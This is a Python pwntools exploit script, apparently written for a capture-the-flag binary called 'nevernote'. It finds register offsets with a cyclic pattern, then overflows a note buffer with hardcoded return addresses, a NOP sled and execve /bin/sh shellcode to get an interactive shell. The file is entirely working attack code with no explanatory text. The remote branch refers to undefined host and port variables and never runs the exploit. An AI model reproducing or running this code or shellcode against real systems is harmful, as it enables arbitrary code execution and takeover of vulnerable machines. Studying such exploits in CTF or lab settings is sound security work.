from pwn import *


def fuzz(f):

	return cyclic(f)

def add(a):

	r.sendline("fahad")
	r.recvuntil("command:")
	r.sendline('a')
	r.recvuntil("note:")
	r.sendline(a)
	data = r.recv()
	return data

def exploit(r):

	#note the size should less than 525 
	f = fuzz(524)

	stack = p32(0x804c058)
	eax = cyclic_find(0x66616165)
	edi = cyclic_find(0x61616166)
	eip = cyclic_find(0x61616165)

	log.info("control eax %d"%eax)
	log.info("control edi %d"%edi)
	log.info("control eip %d" %eip)

	ret = p32(0xbffff5f4)

	system = p32(0xb7e63310)
	sh = p32(0xb7f85d4c)

	shellcodeAddr = 0xbffff5f0 + 4

	log.info("shellcode located in %s"%hex(shellcodeAddr))
	shellcodeAddr = p32(shellcodeAddr)
	shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

	nop = asm('nop')

	add("A" * eax + stack + "C" * eip + shellcodeAddr+ stack + nop * 5 + shellcode + nop * 500) 

	r.interactive()

if __name__ == '__main__':

	if(len(sys.argv) > 2):

		r = remote(host,port)

	else:
		file = 'nevernote'
		binary = os.getcwd() + '/' + file
		r = process(binary)
		print(util.proc.pidof(r))
		pause()
		exploit(r)

